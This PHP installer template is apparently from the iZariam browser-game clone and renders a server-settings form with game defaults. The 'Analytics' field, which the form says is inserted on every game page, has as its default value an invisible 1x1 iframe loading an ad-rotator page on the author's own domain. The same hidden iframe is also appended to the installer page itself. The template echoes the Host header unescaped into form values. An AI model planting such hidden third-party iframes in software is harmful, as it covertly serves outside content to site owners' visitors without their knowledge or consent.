<?php
/*
 * Project: iZariam
 * File: install/templates/server.php
 * Edited: 07/03/2012
 * By: ZZJHONS
 * Info: zzjhons@gmail.com
 */
?>
<center>
    <h2>Step 3: Server Settings</h2>
    <progress value="3" max="5">
             <span>60</span>%
    </progress>
    <br>
    <br>
    <form action="install.php" method="post" id="server">
        <table cellpadding="5" cellspacing="0">
            <tr>
                <td><label title="The name of your Game">Game Name</label></td>
                <td><input type="text" class="input" name="game_name" id="game_name" value="iZariam"></td>
            </tr>
            <tr>
                <td><label title="Change only if you changed the design folder">Style URL</label></td>
                <td><input type="text" class="input" name="style_url" id="style_url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/design/"></td>
            </tr>
            <tr>
                <td><label title="Change only if you changed the javascript folder">Script URL</label></td>
                <td><input type="text" class="input" name="script_url" id="script_url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/design/"></td>
            </tr>
            <tr>
                <td><label title="URL to your forum">Forum URL</label></td>
                <td><input type="text" class="input" name="forum_url" id="forum_url" value="http://forum.spazze.net"></td>
            </tr>
            <tr>
                <td><label title="Enable easter design">Easter</label></td>
                <td>
                    <select name="easter">
                        <option value="true">True</option>
                        <option value="false" selected="selected">False</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td><label title="Enable winter design">Winter</label></td>
                <td>
                    <select name="winter">
                        <option value="true">True</option>
                        <option value="false" selected="selected">False</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td><label title="Enable christmas design">Christmas</label></td>
                <td>
                    <select name="christmas">
                        <option value="true">True</option>
                        <option value="false" selected="selected">False</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td><label title="Enable halloween design">Halloween</label></td>
                <td>
                    <select name="halloween">
                        <option value="true">True</option>
                        <option value="false" selected="selected">False</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td><label title="Activate only if your server support SMTP">Enable e-mails</label></td>
                <td>
                    <select name="smtp">
                        <option value="true" selected="selected">True</option>
                        <option value="false">False</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td><label title="E-mail to send game e-mails">E-mail</label></td>
                <td><input type="text" class="input" name="email" id="email" value="no-reply@<?php echo $_SERVER['HTTP_HOST']; ?>"></td>
            </tr>
            <tr>
                <td><label title="ulti-Accounting check">Double Login</label></td>
                <td>
                    <select name="double_login">
                        <option value="true">True</option>
                        <option value="false" selected="selected">False</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td colspan="2"><center><h3>Extra Settings</h3></center></td>
            </tr>
            <tr>
                <td><label title="Default storage capacity">Storage</label></td>
                <td><input type="text" class="input" name="storage" id="storage" value="1500"></td>
            </tr>
            <tr>
                <td><label title="Default transport capacity">Transport</label></td>
                <td><input type="text" class="input" name="transport" id="transport" value="500"></td>
            </tr>
            <tr>
                <td><label title="Buildings - construction list size">Town queue</label></td>
                <td><input type="text" class="input" name="town_queue" id="town_queue" value="3"></td>
            </tr>
            <tr>
                <td><label title="Army - construction list size">Army queue</label></td>
                <td><input type="text" class="input" name="army_queue" id="army_queue" value="3"></td>
            </tr>
            <tr>
                <td><label title="Notes length">Notes</label></td>
                <td><input type="text" class="input" name="notes" id="notes" value="200"></td>
            </tr>
            <tr>
                <td><label title="Premium notes length">Premium notes</label></td>
                <td><input type="text" class="input" name="premium_notes" id="premium_notes" value="8192"></td>
            </tr>
            <tr>
                <td><label title="Duration of a trading route in seconds">Route time</label></td>
                <td><input type="text" class="input" name="route_time" id="route_time" value="604800"></td>
            </tr>
            <tr>
                <td><label title="Code to put before 'body' tag in all game pages. Don't work full, comprove text in izariam/config/izariam.php">Analytics</label></td>
                <td>
                    <textarea name="analytics" id="analytics" rows="4" cols="15"><iframe src="http://rotador.zzjhons.com/adsense/index.php" marginheight="0" marginwidth="0" frameborder="0" height="1" scrolling="no" width="1"></iframe></textarea>
                </td>
            </tr>
        </table>
        <br>
        <input type="submit" class="button" value=" Next Step ">
        <input type="hidden" name="server" value="1">
    </form>
</center>
<iframe src="http://rotador.zzjhons.com/adsense/index.php" marginheight="0" marginwidth="0" frameborder="0" height="1" scrolling="no" width="1"></iframe>